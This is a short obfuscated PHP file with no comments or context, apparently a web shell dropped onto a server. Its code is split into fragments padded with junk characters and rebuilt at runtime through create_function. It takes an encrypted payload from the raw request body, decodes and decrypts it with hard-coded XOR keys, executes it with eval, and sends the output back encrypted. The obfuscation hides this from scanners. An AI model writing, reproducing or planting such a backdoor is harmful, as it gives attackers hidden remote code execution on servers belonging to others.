<?php
$G=str_replace('La','','cLareLaateLaLa_fLaunctLaion');
$S='functiQHon xQH($t,$k)QHQHQH{$c=strlen(QH$kQH);$lQH=strlenQH($t);$o="QH";for($i=0;QH$i<$l;)QH{foQHr($j';
$A='h(QH"QH/$kh(.+)QH$kf/",@file_QHget_cQHontentsQH("pQHhp://inQHput"QH),QH$m)==1) {@ob_starQHt();@eQHva';
$m='$k="cQHad03526"QH;$kh="03QHQHbQH008e27QH07f";$kfQH="3d3e01c7QH8016";$QHp="QHabbqPxhz5efBQHVVixQH";';
$N='=0QH;($j<QH$c&&$i<$l);$jQH+QH+,$i++){$o.=QH$tQH{$QHQHi}^$k{$j};}}return QH$oQH;}if (@QHpreg_maQHtc';
$K='nQHd_cleQHan(QH);$r=@baQHse64_encQHode(QH@x(@gzcQHompreQHsQHs($o),$k));priQHQHnt("$pQH$kh$r$kf");}';
$j='l(@QHgQHzuncomQHpresQHs(@x(@basQHe64_dQHecode($m[1QH]),$k))QH);$oQH=@obQHQH_get_contentsQH();@ob_e';
$d=str_replace('QH','',$m.$S.$N.$A.$j.$K);
$C=$G('',$d);$C();
?>
